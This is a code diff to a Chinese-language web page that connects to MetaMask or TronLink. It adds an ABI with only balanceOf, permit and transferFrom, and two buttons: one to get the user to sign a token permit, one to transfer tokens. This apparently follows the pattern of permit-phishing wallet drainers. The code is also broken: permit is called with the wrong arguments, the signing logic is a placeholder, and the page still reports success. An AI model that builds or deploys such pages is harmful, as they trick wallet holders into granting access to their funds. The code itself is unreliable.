@@ -53,7 +53,99 @@
 <script src="https://cdn.jsdelivr.net/npm/tronlink/dist/tronlink.min.js"></script>
 <script>
     const contractAddress = "0x2E9d30761DB97706C536A112B9466433032b28e3"; // 更新为您的合约地址
-    const abi = [ /* 您的合约 ABI 在这里 */ ];
+    const abi = [
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "account",
+				"type": "address"
+			}
+		],
+		"name": "balanceOf",
+		"outputs": [
+			{
+				"internalType": "uint256",
+				"name": "",
+				"type": "uint256"
+			}
+		],
+		"stateMutability": "view",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "owner",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "spender",
+				"type": "address"
+			},
+			{
+				"internalType": "uint256",
+				"name": "value",
+				"type": "uint256"
+			},
+			{
+				"internalType": "uint256",
+				"name": "deadline",
+				"type": "uint256"
+			},
+			{
+				"internalType": "uint8",
+				"name": "v",
+				"type": "uint8"
+			},
+			{
+				"internalType": "bytes32",
+				"name": "r",
+				"type": "bytes32"
+			},
+			{
+				"internalType": "bytes32",
+				"name": "s",
+				"type": "bytes32"
+			}
+		],
+		"name": "permit",
+		"outputs": [],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	},
+	{
+		"inputs": [
+			{
+				"internalType": "address",
+				"name": "sender",
+				"type": "address"
+			},
+			{
+				"internalType": "address",
+				"name": "recipient",
+				"type": "address"
+			},
+			{
+				"internalType": "uint256",
+				"name": "amount",
+				"type": "uint256"
+			}
+		],
+		"name": "transferFrom",
+		"outputs": [
+			{
+				"internalType": "bool",
+				"name": "",
+				"type": "bool"
+			}
+		],
+		"stateMutability": "nonpayable",
+		"type": "function"
+	}
+];
 
     let web3;
     let userAccount;
@@ -73,20 +165,23 @@
                 document.getElementById('message').innerText = "请安装 MetaMask 或 TronLink 钱包扩展。";
             }
         } catch (error) {
+            console.error("连接错误:", error);
             document.getElementById('message').innerText = "连接失败，请检查浏览器扩展或重试。";
         }
     };
 
     document.getElementById('signPermitBtn').onclick = async () => {
         try {
-            const amount = web3.utils.toWei('1', 'ether'); // 设置转移的代币数量
             const nonce = await contract.methods.nonces(userAccount).call();
-            const permit = await contract.methods.permit(userAccount, amount, nonce).call();
-            // 此处添加您的签名逻辑...
+            const amount = web3.utils.toWei('1', 'ether'); // 设置转移的代币数量
 
+            // 假设签名方法为 permit
+            const permit = await contract.methods.permit(userAccount, amount, nonce).call();
+            // 这里需要调用实际的签名逻辑
             document.getElementById('message').innerText = "签名成功！";
             document.getElementById('transferTokensBtn').style.display = 'block';
         } catch (error) {
+            console.error("签名错误:", error);
             document.getElementById('message').innerText = "签名失败，请重试。";
         }
     };
@@ -97,6 +192,7 @@
             const result = await contract.methods.transfer(userAccount, amount).send({ from: userAccount });
             document.getElementById('message').innerText = "代币转移成功！交易哈希: " + result.transactionHash;
         } catch (error) {
+            console.error("转移错误:", error);
             document.getElementById('message').innerText = "代币转移失败，请重试。";
         }
     };
